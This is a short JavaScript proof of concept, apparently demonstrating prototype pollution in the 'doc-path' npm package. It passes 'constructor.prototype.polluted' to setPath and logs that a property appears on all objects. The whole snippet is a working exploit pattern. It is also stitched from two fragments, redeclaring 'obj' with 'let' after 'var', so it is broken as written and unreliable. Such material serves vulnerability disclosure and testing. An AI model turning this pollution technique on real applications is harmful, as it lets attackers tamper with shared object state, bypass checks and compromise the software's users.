var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const path = require('doc-path');
let obj = {};
console.log({}.polluted);
path.setPath(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);